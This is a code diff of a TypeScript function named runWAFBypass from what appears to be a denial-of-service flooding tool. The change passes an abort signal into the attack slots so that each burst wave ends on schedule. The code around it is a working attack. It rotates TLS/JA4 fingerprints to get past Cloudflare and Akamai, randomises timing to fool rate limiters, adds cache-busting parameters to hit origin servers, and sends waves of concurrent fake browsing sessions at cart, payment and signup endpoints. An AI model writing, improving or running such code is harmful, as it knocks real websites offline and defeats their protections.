@@ -2063,11 +2063,11 @@ async function runWAFBypass(
   // Cloudflare/Akamai fingerprint-based blocking can't keep up with full JA4 rotation.
   // T002: Response-aware rotation — 5 consecutive 403/429 → immediate reconnect + fresh fingerprint.
   const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA4
-  const runPrimarySlot = async (tgt = target): Promise<void> => {
+  const runPrimarySlot = async (tgt = target, s: AbortSignal = signal): Promise<void> => {
     const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar      = new Map<string, string>();
     let   consec4xx      = 0; // T002: consecutive 403/429 counter per slot
-    while (!signal.aborted) {
+    while (!s.aborted) {
       const tls = randomTLSProfile(); // ★ fresh JA4 profile (ciphers + ecdhCurve + minVersion) each reconnect
       let blocked = false;
       await new Promise<void>(resolve => {
@@ -2089,8 +2089,8 @@ async function runWAFBypass(
         const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
         let inflight    = 0;
         const pump = () => {
-          if (signal.aborted || conn.destroyed) { resolve(); return; }
-          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
+          if (s.aborted || conn.destroyed) { resolve(); return; }
+          while (!s.aborted && !conn.destroyed && inflight < STREAMS_PER) {
             inflight++;
             const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
             const usePost  = Math.random() < 0.22;
@@ -2124,8 +2124,8 @@ async function runWAFBypass(
                 }
               });
               stream.on("data",  () => {});
-              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
-              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
+              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
+              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
               stream.end();
             } catch { inflight--; break; }
           }
@@ -2133,9 +2133,9 @@ async function runWAFBypass(
         conn.on("connect", pump);
         conn.on("error",   () => resolve());
         conn.on("close",   () => resolve());
-        signal.addEventListener("abort", cleanup, { once: true });
+        s.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) {
+      if (!s.aborted) {
         // Human-like timing: most reconnects fast (10-80ms), occasionally long gap (150-800ms)
         // Uniform timing is a bot fingerprint — variance defeats ML-based rate limiters
         const humanDelay = Math.random() < 0.10 ? randInt(150, 800) : randInt(10, 80);
@@ -2167,10 +2167,10 @@ async function runWAFBypass(
     { path: "/api/analytics",             accept: "application/json",          dest: "fetch"    },
     { path: "/api/v1/recommendations",   accept: "application/json",          dest: "fetch"    },
   ];
-  const runSubresourceSlot = async (): Promise<void> => {
+  const runSubresourceSlot = async (s: AbortSignal = signal): Promise<void> => {
     const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar = new Map<string, string>();
-    while (!signal.aborted) {
+    while (!s.aborted) {
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
@@ -2190,7 +2190,7 @@ async function runWAFBypass(
         const MAX_SUB = Math.min(STREAMS_PER, 200);
 
         const fireSub = (sub: typeof SUB_TYPES[0]) => {
-          if (signal.aborted || conn.destroyed || inflight >= MAX_SUB) return;
+          if (s.aborted || conn.destroyed || inflight >= MAX_SUB) return;
           inflight++;
           const path = sub.path + `?v=${randStr(8)}&t=${Date.now()}`;
           const hdrs = {
@@ -2219,12 +2219,12 @@ async function runWAFBypass(
               localPkts++; localBytes += 4096;
               // Then: all sub-resources in parallel (real browser behaviour)
               const shuffled = [...SUB_TYPES].sort(() => Math.random() - 0.5).slice(0, randInt(12, SUB_TYPES.length));
-              shuffled.forEach(s => fireSub(s));
+              shuffled.forEach(sub => fireSub(sub));
             });
             ps.on("data",  () => {});
             ps.on("error", () => resolve());
             ps.on("close", () => {
-              if (!signal.aborted && !conn.destroyed) {
+              if (!s.aborted && !conn.destroyed) {
                 // Click next page
                 const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p));
                 nx.on("response", () => { localPkts++; localBytes += 4096; });
@@ -2239,9 +2239,9 @@ async function runWAFBypass(
         });
         conn.on("error", () => resolve());
         conn.on("close", () => resolve());
-        signal.addEventListener("abort", cleanup, { once: true });
+        s.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(20, 120)));
+      if (!s.aborted) await new Promise(r => setTimeout(r, randInt(20, 120)));
     }
   };
 
@@ -2250,17 +2250,17 @@ async function runWAFBypass(
   // If-None-Match + POST body = guaranteed CDN miss, every request hits origin.
   const VARY_LANGS     = ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","zh-CN,zh;q=0.9","ja-JP,ja;q=0.9","ko-KR,ko;q=0.9","it-IT,it;q=0.9","ru-RU,ru;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"];
   const VARY_ENCODINGS = ["gzip, deflate, br","gzip, deflate","br","gzip","deflate, br, zstd","gzip, br, zstd","identity"];
-  const runCacheAnnihilatorSlot = async (): Promise<void> => {
+  const runCacheAnnihilatorSlot = async (s: AbortSignal = signal): Promise<void> => {
     const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar = new Map<string, string>();
-    while (!signal.aborted) {
+    while (!s.aborted) {
       const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
       const bust     = `?_=${randStr(16)}&v=${randInt(1, 2147483647)}&t=${Date.now()}&r=${randStr(8)}`;
       const fullPath = pagePath + bust;
       try {
         const ac     = new AbortController();
         const timer  = setTimeout(() => ac.abort(), 8_000);
-        if (signal.aborted) { clearTimeout(timer); break; }
+        if (s.aborted) { clearTimeout(timer); break; }
         const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
         const fetchHdrs: Record<string, string> = {};
         for (const [k, v] of Object.entries(wafHdrs)) {
@@ -2299,18 +2299,18 @@ async function runWAFBypass(
     ["/api/v1/products", "/api/v1/search?q=" + randStr(4), "/api/v1/cart", "/api/v1/order", "/api/v1/payment/init"],
     ["/", "/pricing", "/signup", "/api/v1/register", "/api/v1/verify"],
   ];
-  const runSessionAmplifierSlot = async (): Promise<void> => {
+  const runSessionAmplifierSlot = async (s: AbortSignal = signal): Promise<void> => {
     const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar = new Map<string, string>();
-    while (!signal.aborted) {
+    while (!s.aborted) {
       const journey = SESSION_JOURNEYS[randInt(0, SESSION_JOURNEYS.length)];
       for (const step of journey) {
-        if (signal.aborted) return;
+        if (s.aborted) return;
         const isPost = /add|submit|update|login|confirm|payment|register|verify/.test(step);
         try {
           const ac    = new AbortController();
           const timer = setTimeout(() => ac.abort(), 10_000);
-          if (signal.aborted) { clearTimeout(timer); break; }
+          if (s.aborted) { clearTimeout(timer); break; }
           const bust     = `?_s=${randStr(8)}&uid=${randStr(12)}`;
           const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, p);
           const fetchHdrs: Record<string, string> = {};
@@ -2393,24 +2393,24 @@ async function runWAFBypass(
       const bSig   = typeof (AbortSignal as { any?: unknown }).any === "function"
         ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
         : bAbort.signal;
-      void bSig; // used by slots below via closure
       const slots: Promise<void>[] = [];
       const n = wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45;
       if (wave % 3 === 0) {
         // MAX: all vectors at 2× — every 3rd wave
-        for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot());
-        for (let i = 0; i < Math.floor(n * 0.6); i++) slots.push(runSubresourceSlot());
-        for (let i = 0; i < Math.floor(n * 0.4); i++) slots.push(runCacheAnnihilatorSlot());
+        for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot(target, bSig));
+        for (let i = 0; i < Math.floor(n * 0.6); i++) slots.push(runSubresourceSlot(bSig));
+        for (let i = 0; i < Math.floor(n * 0.4); i++) slots.push(runCacheAnnihilatorSlot(bSig));
       } else if (wave % 2 === 0) {
         // Cache + Session heavy — destroys CDN + DB
-        for (let i = 0; i < n;                    i++) slots.push(runCacheAnnihilatorSlot());
-        for (let i = 0; i < Math.floor(n * 0.7); i++) slots.push(runSessionAmplifierSlot());
+        for (let i = 0; i < n;                    i++) slots.push(runCacheAnnihilatorSlot(bSig));
+        for (let i = 0; i < Math.floor(n * 0.7); i++) slots.push(runSessionAmplifierSlot(bSig));
       } else {
         // H2 + subresource heavy — raw bandwidth
-        for (let i = 0; i < n; i++) slots.push(runPrimarySlot());
-        for (let i = 0; i < n; i++) slots.push(runSubresourceSlot());
+        for (let i = 0; i < n; i++) slots.push(runPrimarySlot(target, bSig));
+        for (let i = 0; i < n; i++) slots.push(runSubresourceSlot(bSig));
       }
-      void Promise.all(slots).finally(() => clearTimeout(bTimer));
+      await Promise.all(slots); // wait for burst window — bSig aborts all slots at onMs
+      clearTimeout(bTimer);
       await new Promise<void>(r => setTimeout(r, restMs)); // ★ random rest duration
     }
   };
